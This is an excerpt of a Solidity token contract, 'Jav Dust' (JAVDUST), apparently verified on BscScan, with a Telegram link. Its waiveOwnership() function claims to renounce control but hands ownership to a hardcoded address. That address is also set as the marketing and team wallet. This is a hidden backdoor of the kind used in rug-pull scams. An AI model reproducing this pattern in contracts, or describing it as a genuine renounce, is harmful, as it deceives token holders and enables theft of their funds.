...
/**
 *Submitted for verification at BscScan.com on 2022-11-7
*/


/**
Telegram : https://t.me/JavDust
*/
...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        ...
        _owner = address(0x4d79B88abBc4989d6B74e01262CBDb2a18afdF49);
    }
...
contract JavDust is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "Jav Dust";
    string private _symbol = "JAVDUST";
    uint8 private _decimals = 9;

    address payable private marketingWalletAddress = payable(0x4d79B88abBc4989d6B74e01262CBDb2a18afdF49);
    address payable private teamWalletAddress = payable(0x4d79B88abBc4989d6B74e01262CBDb2a18afdF49);
